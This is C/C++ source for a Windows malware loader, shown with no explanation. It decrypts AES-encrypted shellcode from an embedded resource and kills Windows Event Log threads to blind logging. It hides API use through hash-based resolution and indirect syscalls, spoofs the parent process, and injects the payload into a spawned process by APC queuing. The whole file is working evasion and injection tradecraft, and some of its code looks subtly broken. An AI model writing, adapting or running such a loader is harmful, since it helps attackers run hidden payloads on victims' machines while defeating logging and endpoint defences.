#include <stdio.h>
#include <stdlib.h>		// for strtol
#include <string.h>
#include <windows.h>
#include <bcrypt.h>

#include "SyscallStuff.h"
#include "SeDebugPrivilege.h"
#include "EventLog.h"
#include "Resource.h"

#pragma comment(lib, "Bcrypt.lib")

// Define keysize and NTSTATUS codes for AES encryption function
#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)
#define KEYSIZE 32
#define IVSIZE 16

// Initialize AES struct
typedef struct _AES {
    PBYTE pPlainText;      // base address of the plain text data
    DWORD dwPlainSize;     // size of the plain text data
    PBYTE pCipherText;     // base address of the encrypted data
    DWORD dwCipherSize;    // size of it
    PBYTE pKey;            // the 32 byte key
    PBYTE pIv;             // the 16 byte iv
} AES, * PAES;

// AES IV (kept hardcoded as in original)
unsigned char iv[] = {
    0xFC, 0xB6, 0x0B, 0x04, 0x36, 0x67, 0x2C, 0x76, 0x17, 0x76, 0x47, 0x3F, 0xDE, 0x07, 0xFA, 0xBF
};

// Function to convert hex string to byte array
BOOL HexStringToByteArray(const char* hexString, unsigned char* byteArray, size_t byteArraySize) {
    if (strlen(hexString) != byteArraySize * 2) {
        return FALSE;
    }

    for (size_t i = 0; i < byteArraySize; i++) {
        char hexPair[3] = { hexString[i * 2], hexString[i * 2 + 1], '\0' };
        char* endPtr;
        long byte = strtol(hexPair, &endPtr, 16);
        if (*endPtr != '\0' || byte < 0 || byte > 255) {
            return FALSE;
        }
        byteArray[i] = (unsigned char)byte;
    }
    return TRUE;
}

// Function to load AES decryption
BOOL InstallAesDecryption(PAES pAes) {
    if (!pAes || !pAes->pCipherText || !pAes->pKey || !pAes->pIv || pAes->dwCipherSize == 0) {
        return FALSE;
    }

    BOOL bSTATE = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = 0;
    DWORD dwBlockSize = 0;
    DWORD cbKeyObject = 0;
    PBYTE pbKeyObject = NULL;
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = 0;
    NTSTATUS STATUS = 0;

    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

_EndOfFunc:
    if (hKeyHandle) BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    else if (pbPlainText) {
        HeapFree(GetProcessHeap(), 0, pbPlainText);
    }
    return bSTATE;
}

// Function to decrypt encrypted payload
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (!pCipherTextData || !sCipherTextSize || !pKey || !pIv || !pPlainTextData || !sPlainTextSize) return FALSE;

    AES Aes;
    Aes.pKey = pKey;
    Aes.pIv = pIv;
    Aes.pCipherText = (PBYTE)pCipherTextData;
    Aes.dwCipherSize = sCipherTextSize;

    if (!InstallAesDecryption(&Aes)) return FALSE;

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;
    return TRUE;
}

// If ran in Elevated Context, Kills Event Logging threads
BOOL IfElevated()
{
    // Update current process with SeDebugPrivilege Token (if admin priv)
    if (UpdatePriv(SE_DEBUG_NAME) == 0)
    {
    }
    else
    {
        return -1;
    }

    // Killing EventLog Threads from the responsible svchost.exe processes
    int i = 0;

    while (i == 0)
    {
        if (KillEventLogThreads() != 0)
        {
            flag = FALSE;
            return flag;
        }
    }

    return TRUE;
}

DWORD64 djb2(const char* str)
{
    DWORD64 dwHash = 0x7734773477347734;
    int c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

const char* PWSTR_to_Char(const wchar_t* wideStr)
{
    int size = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
    char* buffer = new char[size];
    WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, buffer, size, NULL, NULL);
    return buffer;
}

PWSTR LPSTR_to_PWSTR(LPSTR pFuncName)
{
    int bufferSize = MultiByteToWideChar(CP_ACP, 0, pFuncName, -1, NULL, 0);
    if (bufferSize == 0)
    {
        return FALSE;
    }

    PWSTR wideString = (PWSTR)malloc(bufferSize * sizeof(WCHAR));
    if (wideString == NULL)
    {
        return FALSE;
    }

    int result = MultiByteToWideChar(CP_ACP, 0, pFuncName, -1, wideString, bufferSize);
    if (result == 0)
    {
        free(wideString);
        return FALSE;
    }

    return wideString;
}

LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
{
    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)DllBase;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((LPBYTE)DllBase + DOS_HEADER->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfNames);
    PWORD fOrdinals = (PWORD)((LPBYTE)DllBase + EXdir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++)
    {
        LPSTR pFuncName = (LPSTR)((LPBYTE)DllBase + fNames[i]);
        DWORD64 hash = djb2(pFuncName);

        if (hash == passedHash)
        {
            return (LPVOID)((LPBYTE)DllBase + fAddr[fOrdinals[i]]);
        }
    }
    return 0;
}

HMODULE ResolveDLL(DWORD64 passedHash)
{
    PNT_TIB pTIB = (PNT_TIB)__readgsqword(0x30);
    PTEB pTEB = (PTEB)pTIB->Self;
    PPEB pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
    if (pPEB == NULL)
    {
        return NULL;
    }

    PPEB_LDR_DATA pPEB_LDR_DATA = (PPEB_LDR_DATA)(pPEB->Ldr);
    PLIST_ENTRY ListHead = &pPEB->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY ListEntry = ListHead->Flink;

    while (ListHead != ListEntry)
    {
        PLDR_DATA_TABLE_ENTRY LdrEntry = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        UNICODE_STRING BaseDllName = (UNICODE_STRING)(LdrEntry->BaseDllName);
        HMODULE DllBase = (HMODULE)(LdrEntry->DllBase);

        const char* Dllname = PWSTR_to_Char(BaseDllName.Buffer);
        DWORD64 retrievedhash = djb2(Dllname);

        if (retrievedhash == passedHash)
        {
            delete[] Dllname;
            return DllBase;
        }

        delete[] Dllname;
        ListEntry = ListEntry->Flink;
    }

    return 0;
}

int main(int argc, char** argv)
{
    if (argc < 3)
    {
        return 1;
    }

    char* p;
    int ppid = strtol(argv[1], &p, 10);
    if (*p != '\0') {
        return 1;
    }

    // Parse AES key from command-line argument
    unsigned char key[KEYSIZE];
    if (!HexStringToByteArray(argv[2], key, KEYSIZE)) {
        return 1;
    }

    BOOL FLAG = IfElevated();
    if (FLAG == FALSE)
    {
        flag = FLAG;
    }

    PVOID BaseAddress = NULL;

    // Load shellcode from resource
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (!hRes)
    {
        return 1;
    }

    HGLOBAL hResLoad = LoadResource(NULL, hRes);
    if (!hResLoad)
    {
        return 1;
    }

    PBYTE enc_shellcode_bin = (PBYTE)LockResource(hResLoad);
    DWORD shellcode_size = SizeofResource(NULL, hRes);
    if (!enc_shellcode_bin || shellcode_size == 0)
    {
        return 1;
    }

    // SIZE_T shellcode variable for NT API operation
    SIZE_T shellcode_size2 = shellcode_size;
    ULONG shcSize = (ULONG)shellcode_size;

    // Decrypt shellcode
    PVOID decrypted_shellcode = NULL;
    DWORD decrypted_size = 0;

    if (!SimpleDecryption(enc_shellcode_bin, shellcode_size, key, iv, &decrypted_shellcode, &decrypted_size))
    {
        return 1;
    }

    // Update sizes for decrypted shellcode
    shellcode_size = decrypted_size;
    shellcode_size2 = decrypted_size;
    shcSize = (ULONG)decrypted_size;

    WORD syscallNum = NULL;
    INT_PTR syscallAddress = NULL;

    STARTUPINFOEXA sie;
    PROCESS_INFORMATION pi;
    ZeroMemory(&sie, sizeof(sie));
    ZeroMemory(&pi, sizeof(pi));

    sie.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    sie.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProc = NULL;

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;

    HMODULE hDLL = ResolveDLL(0x4FD1CD7BBE06FCFC);

    LPVOID pNtOpenProc = ResolveNtAPI(hDLL, 0x718CCA1F5291F6E7);
    syscallNum = SortSSN(pNtOpenProc);
    syscallAddress = GetsyscallInstr(pNtOpenProc);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddress);

    NtOpenProcess = &sysNtOpenProcess;

    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, 0, NULL, NULL);
    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)ppid;
    pClientId.UniqueThread = (PVOID)0;

    NTSTATUS NtOpenProcessstatus = NtOpenProcess(&hParentProc, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);
    if (!NT_SUCCESS(NtOpenProcessstatus))
    {
        return 1;
    }
    else
    {
        if (hParentProc == NULL)
        {
            return 1;
        }
    }

    SIZE_T size = 0;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    sie.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    InitializeProcThreadAttributeList(sie.lpAttributeList, 2, 0, &size);

    UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProc, sizeof(HANDLE), NULL, NULL);
    UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(HANDLE), NULL, NULL);

    using SuspendThreadPrototype = DWORD(WINAPI*)(HANDLE);
    SuspendThreadPrototype SuspendThread = (SuspendThreadPrototype)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SuspendThread");

    using CreateProcessAPrototype = BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    CreateProcessAPrototype CreateProcessA = (CreateProcessAPrototype)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");

    if (!CreateProcessA((LPSTR)SPAWN, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
    {
        HeapFree(GetProcessHeap(), 0, sie.lpAttributeList);
        return 1;
    }

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    SuspendThread(hThread);

    LPVOID pNtAlloc = ResolveNtAPI(hDLL, 0xF5BD373480A6B89B);
    syscallNum = SortSSN(pNtAlloc);
    syscallAddress = GetsyscallInstr(pNtAlloc);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddress);

    NtAllocateVirtualMemory = &sysNtAllocateVirtualMemory;

    NTSTATUS status1 = NtAllocateVirtualMemory(hProcess, &BaseAddress, 0, &shellcode_size2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1))
    {
        HeapFree(GetProcessHeap(), 0, sie.lpAttributeList);
        return 1;
    }

    LPVOID pNtWrite = ResolveNtAPI(hDLL, 0x68A3C2BA486F0741);
    syscallNum = SortSSN(pNtWrite);
    syscallAddress = GetsyscallInstr(pNtWrite);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddress);

    NtWriteVirtualMemory = &sysNtWriteVirtualMemory;

    NTSTATUS NtWriteStatus1 = NtWriteVirtualMemory(hProcess, BaseAddress, decrypted_shellcode, shcSize, NULL);
    if (!NT_SUCCESS(NtWriteStatus1))
    {
        HeapFree(GetProcessHeap(), 0, sie.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, decrypted_shellcode);
        return 1;
    }

    DWORD OldProtect = 0;
    LPVOID pNtProtect = ResolveNtAPI(hDLL, 0x858BCB1046FB6A37);
    syscallNum = SortSSN(pNtProtect);
    syscallAddress = GetsyscallInstr(pNtProtect);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddress);

    NtProtectVirtualMemory = &sysNtProtectVirtualMemory;

    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hProcess, &BaseAddress, &shellcode_size2, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1))
    {
        HeapFree(GetProcessHeap(), 0, sie.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, decrypted_shellcode);
        return 1;
    }

    LPVOID pNtQueueApcThread = ResolveNtAPI(hDLL, 0x7073ED9F921A0267);
    syscallNum = SortSSN(pNtQueueApcThread);
    syscallAddress = GetsyscallInstr(pNtQueueApcThread);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddress);

    NtQueueApcThread = &sysNtQueueApcThread;

    LPVOID pAlloc = BaseAddress;

    NTSTATUS NtQueueApcThreadStatus1 = NtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAlloc, pAlloc, NULL, NULL);
    if (!NT_SUCCESS(NtQueueApcThreadStatus1))
    {
        HeapFree(GetProcessHeap(), 0, sie.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, decrypted_shellcode);
        return 1;
    }

    DWORD ret = ResumeThread(pi.hThread);
    if (ret == 0XFFFFFFFF)
    {
        HeapFree(GetProcessHeap(), 0, sie.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, decrypted_shellcode);
        return 1;
    }

    HeapFree(GetProcessHeap(), 0, sie.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, decrypted_shellcode);

    return 0;
}